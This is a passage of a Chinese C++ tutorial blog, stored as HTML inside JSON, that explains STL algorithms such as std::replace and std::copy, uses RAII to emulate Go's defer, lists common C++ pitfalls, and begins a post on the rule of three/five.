class=\"line\">&#125;</span><br><span class=\"line\">_Replace_unchecked 的源码：</span><br><span class=\"line\"></span><br><span class=\"line\">_Replace_unchecked 的源码：</span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> _<span class=\"title\">FwdIt</span>,<span class=\"keyword\">class</span> _<span class=\"title\">Ty</span>&gt;</span> <span class=\"keyword\">inline</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> _Replace_unchecked(_FwdIt _First, _FwdIt _Last, <span class=\"keyword\">const</span> _Ty&amp; _Oldval, <span class=\"keyword\">const</span> _Ty&amp; _Newval)</span><br><span class=\"line\">&#123;\t<span class=\"comment\">// replace each matching _Oldval with _Newval</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; _First != _Last; ++_First)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (*_First == _Oldval)</span><br><span class=\"line\">\t\t\t*_First = _Newval;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>例如：检查文件路径，将所有斜杠替换成反斜杠：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::string path = <span class=\"string\">R&quot;(C:\\Users\\XUranus/Desktop/1.txt)&quot;</span>;</span><br><span class=\"line\">std::<span class=\"built_in\">replace</span>(path.<span class=\"built_in\">begin</span>(), path.<span class=\"built_in\">end</span>(), <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&#x27;\\\\&#x27;</span>); <span class=\"comment\">// path: C:\\Users\\XUranus\\Desktop\\1.txt</span></span><br></pre></td></tr></table></figure></p>\n<p>如果要替换的元素需要满足非相等的更复杂的逻辑，可以用<code>std::replace_if</code>，和<code>std::replace</code>类似，只是其中的参数3从接受<code>_Oldval</code>改为接受一个匿名函数。</p>\n<p>例如：将数组中所有大于100的值置为-1：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; vec = &#123; <span class=\"number\">10</span>, <span class=\"number\">104</span>, <span class=\"number\">20</span>, <span class=\"number\">67</span>, <span class=\"number\">300</span>&#125;;</span><br><span class=\"line\">std::<span class=\"built_in\">replace_if</span>(</span><br><span class=\"line\">    vec.<span class=\"built_in\">begin</span>(),</span><br><span class=\"line\">    vec.<span class=\"built_in\">end</span>(),</span><br><span class=\"line\">    std::<span class=\"built_in\">bind</span>(std::greater&lt;<span class=\"keyword\">int</span>&gt;(), std::placeholder::_1, <span class=\"number\">100</span>),</span><br><span class=\"line\">    <span class=\"number\">-1</span>); <span class=\"comment\">// vec: &#123; 10, -1, 20, 67, -1&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"std-copy\"><a href=\"#std-copy\" class=\"headerlink\" title=\"std::copy\"></a>std::copy</h3><p><code>std::copy(Iterator _first, Iterator _end, Iterator _dst)</code>拷贝<code>[_first, _end)</code>范围中的元素到始于<code>_dst</code>往后的位置。例：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; src = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\"><span class=\"function\">std::vector&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">container</span><span class=\"params\">(<span class=\"number\">3</span>)</span></span>;</span><br><span class=\"line\">std::<span class=\"built_in\">copy</span>(src.<span class=\"built_in\">begin</span>(), src.<span class=\"built_in\">end</span>(), container.<span class=\"built_in\">begin</span>());</span><br></pre></td></tr></table></figure>\n<p><strong>此处<code>copy</code>只负责复制，不负责申请空间，所以复制前必须有足够的空间</strong>。如果container的大小小于输入序列的长度的话，这段代码会导致崩溃（crash）。所以此时引入了<code>std::back_inserter</code>:<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; src = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; container;</span><br><span class=\"line\">std::<span class=\"built_in\">copy</span>(src.<span class=\"built_in\">begin</span>(), src.<span class=\"built_in\">end</span>(), std::<span class=\"built_in\">back_inserter</span>(container))</span><br></pre></td></tr></table></figure><br>标准库提供的<code>std::back_inserter</code>模板函数很方便，因为它为container返回一个<code>back_insert_iterator</code>迭代器：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// iterator header</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> _<span class=\"title\">Container</span>&gt;</span></span><br><span class=\"line\"><span class=\"function\">_NODISCARD _CONSTEXPR20 back_insert_iterator&lt;_Container&gt; <span class=\"title\">back_inserter</span><span class=\"params\">(_Container&amp; _Cont)</span> <span class=\"keyword\">noexcept</span> <span class=\"comment\">/* strengthened */</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// return a back_insert_iterator</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> back_insert_iterator&lt;_Container&gt;(_Cont);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样，复制的元素都被追加到container的末尾了。(就算container为空也没事)。该迭代器扩展目的容器为每一次复制扩展元素，确保了容器有足够的大小来容纳每个元素。</p>\n<h3 id=\"std-next-permutation\"><a href=\"#std-next-permutation\" class=\"headerlink\" title=\"std::next_permutation\"></a>std::next_permutation</h3><p><code>std::next_permutation</code>用于找到数组的下一个排列，常用于获得数组的全排列。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; vec &#123;<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">4</span>&#125;;</span><br><span class=\"line\">std::<span class=\"built_in\">sort</span>(vec.<span class=\"built_in\">begin</span>(), vec.<span class=\"built_in\">end</span>());</span><br><span class=\"line\"><span class=\"keyword\">while</span> (std::<span class=\"built_in\">next_permutation</span>(vec.<span class=\"built_in\">begin</span>(), vec.<span class=\"built_in\">end</span>())) &#123; <span class=\"comment\">// return false if vec is in descending sequence</span></span><br><span class=\"line\">    <span class=\"comment\">// print current vector ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"RAII构造defer\"><a href=\"#RAII构造defer\" class=\"headerlink\" title=\"RAII构造defer\"></a>RAII构造defer</h3><p>Golang中提供了一个<code>defer</code>关键字用于在函数完成后例机执行一个代码块，常用于执行资源清理任务：<br><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;os&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// Open the file.</span></span><br><span class=\"line\">\tfile, err := os.Open(<span class=\"string\">&quot;example.txt&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;Error opening file:&quot;</span>, err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Schedule the file to be closed when the surrounding function (main) returns.</span></span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> file.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Perform file operations here.</span></span><br><span class=\"line\">\t<span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;File operations completed successfully.&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这个例子中<code>defer file.Close()</code>用于保证该语句会在<code>main</code>函数返回前执行，从而保证了文件打开句柄使用后被关闭。</p>\n<p>C++中可以用RAII机制实现Golang中<code>defer</code>的效果。RAII（Resource Acquisition Is Initialization）是一种C++编程技术，用于在对象的生命周期中自动管理资源。其核心思想是将资源的获取与对象的初始化绑定在一起，将资源的释放与对象的销毁绑定在一起。这种方式可以确保在对象生命周期结束时（例如离开作用域、抛出异常等情况），资源会被自动释放，从而避免资源泄漏。</p>\n<p>RAII 在C++中通过构造函数和析构函数实现。构造函数负责初始化对象并获取资源，析构函数负责释放资源。当对象在栈上创建时，其析构函数会在对象离开作用域时自动调用，从而释放资源。C++ STL中的智能指针<code>unique_ptr</code>、<code>shared_ptr</code>使用RAII管理指针的释放，<code>unique_lock</code>和<code>lock_guard</code>使用RAII管理mutex的释放。</p>\n<p>C++可以用STL提供的现成的智能指针和lambda函数模拟<code>defer</code>：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;memory&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> std::string path = <span class=\"string\">&quot;/home/xuranus/example.txt&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> BUFF_MAX = <span class=\"number\">1024</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[BUFF_MAX] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> fd = ::<span class=\"built_in\">open</span>(path.<span class=\"built_in\">c_str</span>() , O_RDONLY | O_NONBLOCK);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; <span class=\"string\">&quot;file open failed&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// shared_ptr and lambda function to implement &quot;defer&quot;</span></span><br><span class=\"line\">    <span class=\"function\">std::shared_ptr&lt;<span class=\"keyword\">void</span>&gt; <span class=\"title\">defer</span><span class=\"params\">(<span class=\"literal\">nullptr</span>, [&amp;](...) &#123;</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        ::close(fd);</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        std::cout &lt;&lt; <span class=\"string\">&quot;file closed&quot;</span> &lt;&lt; std::endl;</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    &#125;)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> n = ::<span class=\"built_in\">read</span>(fd, buff, BUFF_MAX);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::string str;</span><br><span class=\"line\">    str.<span class=\"built_in\">assign</span>(buff, n);</span><br><span class=\"line\">    std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种方式实现最简单，就地取材，但是存在以下问题：</p>\n<ol>\n<li><code>shared_ptr</code>会在堆上申请内存，频繁使用容易造成内存的碎片化</li>\n<li>生成的<code>defer</code>对象可以被拷贝，而清理函数只能执行一次</li>\n</ol>\n<p>于其滥用智能指针，更好的方案还是自己封装一个<code>defer</code>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// defer.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;memory&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DeferImpl</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"comment\">// construct from function</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"title\">DeferImpl</span><span class=\"params\">(<span class=\"keyword\">const</span> DeferFunc&amp; deferFunc)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"title\">DeferImpl</span><span class=\"params\">(DeferFunc&amp;&amp; deferFunc)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">DeferImpl</span>(DeferImpl&lt;DeferFunc&gt;&amp;&amp; deferFunc);</span><br><span class=\"line\"></span><br><span class=\"line\">    ~<span class=\"built_in\">DeferImpl</span>();</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"comment\">// delete copy and assignment constructor</span></span><br><span class=\"line\">    <span class=\"built_in\">DeferImpl</span>(<span class=\"keyword\">const</span> DeferImpl&lt;DeferFunc&gt;&amp;) = <span class=\"keyword\">delete</span>;</span><br><span class=\"line\">    DeferImpl&amp; <span class=\"keyword\">operator</span> = (<span class=\"keyword\">const</span> DeferImpl&amp;) = <span class=\"keyword\">delete</span>;</span><br><span class=\"line\">    DeferImpl&amp; <span class=\"keyword\">operator</span> = (DeferImpl&amp;&amp;) = <span class=\"keyword\">delete</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    DeferFunc   m_func;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span>        m_valid;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt; <span class=\"keyword\">inline</span> DeferImpl&lt;DeferFunc&gt;::<span class=\"built_in\">DeferImpl</span>(<span class=\"keyword\">const</span> DeferFunc&amp; deferFunc)</span><br><span class=\"line\">    : <span class=\"built_in\">m_func</span>(deferFunc), <span class=\"built_in\">m_valid</span>(<span class=\"literal\">true</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt; <span class=\"keyword\">inline</span> DeferImpl&lt;DeferFunc&gt;::<span class=\"built_in\">DeferImpl</span>(DeferFunc&amp;&amp; deferFunc)</span><br><span class=\"line\">    : <span class=\"built_in\">m_func</span>(std::<span class=\"built_in\">move</span>(deferFunc)), <span class=\"built_in\">m_valid</span>(<span class=\"literal\">true</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt; <span class=\"keyword\">inline</span> DeferImpl&lt;DeferFunc&gt;::<span class=\"built_in\">DeferImpl</span>(DeferImpl&lt;DeferFunc&gt;&amp;&amp; deferImpl)</span><br><span class=\"line\">    : <span class=\"built_in\">m_func</span>(std::<span class=\"built_in\">move</span>(deferImpl.m_func)), <span class=\"built_in\">m_valid</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    deferImpl.m_valid = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt; <span class=\"keyword\">inline</span> DeferImpl&lt;DeferFunc&gt;::~<span class=\"built_in\">DeferImpl</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_valid) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">m_func</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> DeferFunc&gt; DeferImpl&lt;DeferFunc&gt; <span class=\"title\">MakeDeferIns</span><span class=\"params\">(DeferFunc&amp;&amp; func)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> DeferImpl&lt;DeferFunc&gt;(std::forward&lt;DeferFunc&gt;(func));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> CONCAT_(a, b, c) a##b##c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> CONCAT(a, b, c) CONCAT_(a, b, c)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> defer(codeBlocks) \\</span></span><br><span class=\"line\"><span class=\"meta\">    auto CONCAT(defer_, __LINE__, __COUNTER__) = MakeDeferIns(codeBlocks)</span></span><br></pre></td></tr></table></figure><br>该实现的基本思路是：</p>\n<ol>\n<li>先实现一个<code>DeferImpl</code>类封装一个匿名函数，在析构发时候执行内部函数</li>\n<li>用宏定义实现<code>defer</code>，使用<code>__LINE__</code>和<code>__COUNTER__</code>宏在调用<code>defer</code>时在栈上创建独一无二的变量，名称格式为为<code>defer_$line$counter</code>，类型为<code>DeferImpl</code>。</li>\n</ol>\n<p>写一个测试程序，其中包含了多个<code>defer</code>代码块：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.cpp</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;defer.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> std::string path = <span class=\"string\">&quot;/home/xuranus/file.txt&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> BUFF_MAX = <span class=\"number\">1024</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[BUFF_MAX] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> fd = ::<span class=\"built_in\">open</span>(path.<span class=\"built_in\">c_str</span>() , O_RDONLY | O_NONBLOCK);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; <span class=\"string\">&quot;file open failed&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">defer</span>([&amp;](...)&#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">close</span>(fd);</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;file closed&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"built_in\">defer</span>([]()&#123;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;defer block 1&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"built_in\">defer</span>([]()&#123;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;defer block 2&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"built_in\">defer</span>([]()&#123;</span><br><span class=\"line\">        std::cout &lt;&lt; <span class=\"string\">&quot;defer block 3&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n = ::<span class=\"built_in\">read</span>(fd, buff, BUFF_MAX);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::string str;</span><br><span class=\"line\">    str.<span class=\"built_in\">assign</span>(buff, n)</span><br><span class=\"line\">    std::cout &lt;&lt; str &lt;&lt; std::endl; <span class=\"comment\">// hello world</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>程序输出<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">helloworld</span><br><span class=\"line\"></span><br><span class=\"line\">defer block 3</span><br><span class=\"line\">defer block 2</span><br><span class=\"line\">defer block 1</span><br><span class=\"line\">file closed</span><br></pre></td></tr></table></figure><br>对于其中多个<code>defer</code>代码块，执行的顺序是从下往上。这是因为<strong>C++中为了保证资源释放的正确顺序，总是以和构造的相反的顺序执行析构函数</strong>。所以如果需要在一个函数中声明多个<code>defer</code>，需要注意他们的相对顺序。</p>\n","tags":["CPP"]},{"title":"C++易错概念","url":"/2022/06/24/C-%E6%98%93%E9%94%99%E6%A6%82%E5%BF%B5/","content":"<h2 id=\"构造函数\"><a href=\"#构造函数\" class=\"headerlink\" title=\"构造函数\"></a>构造函数</h2><p>构造函数不能定义为虚函数</p>\n<p>构造器的执行过程分为两个阶段：<strong>初始化</strong>和<strong>普通计算</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"keyword\">int</span> value1;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> value2;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Demo</span>(<span class=\"keyword\">int</span> v1, <span class=\"keyword\">int</span> v2):<span class=\"built_in\">value2</span>(v2), <span class=\"built_in\">value1</span>(v1) &#123; <span class=\"comment\">// 初始化</span></span><br><span class=\"line\">    <span class=\"comment\">// 普通计算</span></span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p>初始化阶段中，不在初始化列表的对象执行默认的初始化方法，在初始化列表中的尘缘执行指定的构造方法。在普通计算阶段，也可对初始过的成员变量再做修改。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"keyword\">int</span> value1;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> value2;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Demo</span>(): <span class=\"built_in\">value1</span>(<span class=\"number\">1</span>), <span class=\"built_in\">value2</span>(value1) &#123;&#125; <span class=\"comment\">//错误</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>初始化阶段不一定顺序执行成员初始化，不能使用某个成员初始化其他成员。</p>\n<p>拷贝构造/复制构造函数<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">CLASS_NAME</span>(<span class=\"keyword\">const</span> CLASS_NAME&amp;); <span class=\"comment\">// const可选</span></span><br></pre></td></tr></table></figure><br>如果类没有显式声明一个拷贝构造函数，那么，编译器会自动生成一个进行对象之间非static成员的<strong>位</strong>拷贝</p>\n<p>拷贝函数的调用场景：</p>\n<ul>\n<li>对象作为函数参数，值传递</li>\n<li>对象作为函数返回值，以值传递的形式返回</li>\n<li>对象用于给另外一个对象初始化（赋值初始化）</li>\n</ul>\n<p>析构函数：如果没有定义，编译器会提供一个默认的析构函数</p>\n<p>类的静态成员：静态成员变量一般要在类外初始化（即使是private）。类的静态方法不能直接访问类的静态成员变量，而类的任何成员函数都能访问类的静态成员。</p>\n<p>友元：友元允许特定非成员函数访问一个类的私有成员。友元会破坏类的封装。<br>可以声明友元类和友元函数。</p>\n"},{"title":"C++的三五法则与拷贝移动语义","url":"/2022/07/17/C-%E7%9A%84%E4%B8%89%E4%BA%94%E6%B3%95%E5%88%99/","content":"<p>我们先来看一个<code>matrix</code>类在C++中如何实现：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">matrix</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">int</span> nrow, ncol;</span><br><span class=\"line\">    <span class=\"keyword\">double</span>** value;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">matrix</span>(<span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> c);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>首先定义字段，在<code>matrix</code>中定义了行数<code>nrow</code>和列数<code>ncol</code>，以及指向存储数据的指针<code>value</code>。然后定义构造函数<code>matrix int r, int c)</code>。由于<code>matrix</code>有一个指针字段<code>value</code>，指向的数据需要在堆上动态分配，所以<code>matrix</code>类型的对象在拷贝时需要注意深浅拷贝的问题，在栈上对象离开作用域则需要考虑析构的问题，所以我们还需要显式地或隐式地指定了<code>matrix</code>类型的对象在<strong>拷贝</strong>、<strong>赋值</strong>和<strong>销毁</strong>时的行为。</p>\n<span id=\"more\"></span>\n<h2 id=\"三五法则\"><a href=\"#三五法则\" class=\"headerlink\" title=\"三五法则\"></a>三五法则</h2><p>一个类通过定义三种特殊的成员方法来控制这些操作：</p>\n<ul>\n<li>拷贝构造函数</li>\n<li>拷贝赋值运算符</li>\n<li>析构函数</li>\n</ul>\n<p>我们将这些操作称为拷贝控制操作，由于拷贝控制操作是由三个特殊的成员函数来完成的，所以我们称此为“<strong>C++三法则</strong>”。在较新的C++11标准中，为了支持<strong>移动语义</strong>，又增加了<strong>移动构造函数</strong>和<strong>移动赋值运算符</strong>，这样共有五个特殊的成员函数，所以又称为“<strong>C++五法则</strong>”。也就是说，“三法则”是针对较旧的C++89标准说的，“五法则”是针对较新的C++11标准说的。为了统一称呼，后来人们把它叫做“C++三/五法则”。</p>\n<p><img src=\"Screenshot_20220717_180627.png\" alt=\"\"></p>\n<p>加上这五个成员方法后<code>matrix</code>定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.h</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">matrix</span> </span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">int</span> nrow, ncol;</span><br><span class=\"line\">    <span class=\"keyword\">double</span>* value;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">matrix</span>(<span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> c, <span class=\"keyword\">double</span> v = <span class=\"number\">0</span>);</span><br><span class=\"line\">    